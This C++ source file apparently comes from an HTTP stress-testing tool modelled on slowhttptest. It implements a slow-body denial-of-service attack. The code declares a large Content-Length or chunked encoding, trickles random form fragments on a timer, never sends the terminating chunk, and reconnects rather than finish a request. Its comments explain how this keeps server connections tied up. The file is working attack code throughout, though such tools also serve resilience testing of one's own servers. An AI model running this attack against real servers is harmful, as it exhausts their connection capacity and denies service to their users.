// SPDX-License-Identifier: Apache-2.0
// Copyright 2011-2026 Sergey Shekyan and contributors
#include "slowhttp/attacks/slow_body.hpp"

#include "slowhttp/request.hpp"

#include <cstddef>
#include <cstdio>
#include <utility>

namespace slowhttp {
namespace {
// The classic tool opens the body with this, so the request looks like a real
// form submission that simply has not finished arriving.
const char kOpeningBody[] = "foo=bar";
}  // namespace

SlowBody::SlowBody(const Config& cfg)
    : cfg_(cfg),
      // A caller-supplied payload replaces the placeholder entirely: endpoints
      // that validate their input reject "foo=bar" before the hold can bite, so
      // the whole attack lands on a 400 handler instead of the real one.
      opening_body_bytes_(frame(cfg.body_data.empty() ? std::string(kOpeningBody)
                                                      : cfg.body_data)),
      headers_(build_headers()),
      opening_body_(opening_body_bytes_.size()),
      interval_(std::chrono::duration_cast<Millis>(cfg.interval)),
      rng_(std::random_device{}()),
      body_sent_(static_cast<std::size_t>(cfg.connections), 0) {}

void SlowBody::on_open(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < body_sent_.size())
    body_sent_[id] = 0;
}

Action SlowBody::on_connect(ConnId id) {
  if (id >= 0 && static_cast<std::size_t>(id) < body_sent_.size())
    body_sent_[id] = opening_body_;
  return Action::send(headers_, interval_);
}

Action SlowBody::on_timer(ConnId id) {
  std::string chunk = frame(followup_chunk());
  if (id >= 0 && static_cast<std::size_t>(id) < body_sent_.size()) {
    // Chunked framing has no declared length to run out of. The request ends at
    // the terminating zero-length chunk and nowhere else, and that chunk is
    // never sent -- so there is no point at which this connection must be
    // recycled to keep the hold, and it simply runs until the test ends.
    if (!cfg_.chunked) {
      const std::size_t limit = static_cast<std::size_t>(cfg_.content_length);
      // Completing the body would hand the server a finished request, which it
      // would answer and close -- ending the hold. Start a fresh connection
      // instead of finishing the one we have.
      if (body_sent_[id] + chunk.size() >= limit) return Action::reconnect();
    }
    body_sent_[id] += chunk.size();
  }
  return Action::send(std::move(chunk), interval_);
}

Action SlowBody::on_readable(ConnId /*id*/, const char* /*data*/,
                             std::size_t /*len*/) {
  // The server answered (or hung up) without waiting for the rest of the body.
  return Action::reconnect();
}

std::string SlowBody::build_headers() const {
  std::string req;
  req.reserve(320);
  RequestSpec spec = RequestSpec::from(cfg_);
  if (cfg_.chunked) {
    // No Content-Length at all. Sending both is the request-smuggling desync
    // (RFC 9112 6.1), and a server that rejects the pair would look like a
    // target defending itself when it is really refusing malformed input.
    spec.set("Transfer-Encoding", "chunked");
  } else {
    // The promise the server will wait on: far more body than we intend to
    // send. This is the attack; everything else about the request is ordinary.
    spec.set("Content-Length", std::to_string(cfg_.content_length));
  }
  spec.set("Content-Type", cfg_.content_type);
  spec.set("Connection", "close");
  req += spec.serialize_http11();
  // Headers end here -- deliberately complete, unlike Slowloris. Only the body
  // that follows is withheld.
  req += "\r\n";
  req += opening_body_bytes_;
  return req;
}

std::string SlowBody::followup_chunk() {
  // "&xx=xx", matching the classic tool's body payload pattern.
  std::string chunk = "&";
  chunk += random_token(cfg_.max_random_data_len);
  chunk += "=";
  chunk += random_token(cfg_.max_random_data_len);
  return chunk;
}

std::string SlowBody::random_token(int max_len) {
  static const char kAlphabet[] =
      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  int hi = max_len < 2 ? 2 : max_len;
  std::uniform_int_distribution<int> len_dist(1, hi);
  std::uniform_int_distribution<int> ch_dist(0, sizeof(kAlphabet) - 2);
  int n = len_dist(rng_);
  std::string s;
  s.reserve(n);
  for (int i = 0; i < n; ++i) s += kAlphabet[ch_dist(rng_)];
  return s;
}

std::string chunk_frame(const std::string& body) {
  // A zero-length fragment would encode as the terminating chunk and end the
  // request -- the one thing this attack must never send -- so it produces
  // nothing at all rather than being framed.
  if (body.empty()) return std::string();
  char size[24];
  std::snprintf(size, sizeof(size), "%zx\r\n", body.size());
  std::string out(size);
  out += body;
  out += "\r\n";
  return out;
}

std::string SlowBody::frame(std::string body) const {
  return cfg_.chunked ? chunk_frame(body) : body;
}

}  // namespace slowhttp
